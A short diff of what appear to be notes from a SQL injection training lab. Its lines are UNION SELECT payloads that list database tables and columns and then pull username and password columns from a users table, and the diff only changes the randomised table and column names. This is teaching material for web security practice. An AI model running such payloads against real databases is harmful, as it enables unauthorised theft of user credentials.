@@ -31,13 +31,13 @@ SELECT table_name FROM information_schema.tables WHERE table_schema='public'
 
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_gschdb'--
 
-' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name ='users_gschdb' --
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name ='users_ooqxwr' --
 
 
 username_dvaxoj
 password_qnnwnl
 
-' UNION SELECT  username_dvaxoj, password_qnnwnl FROM  users_gschdb--
+' UNION SELECT  username_cadxgj, password_noyvks FROM  users_ooqxwr--
 
 
 wiener
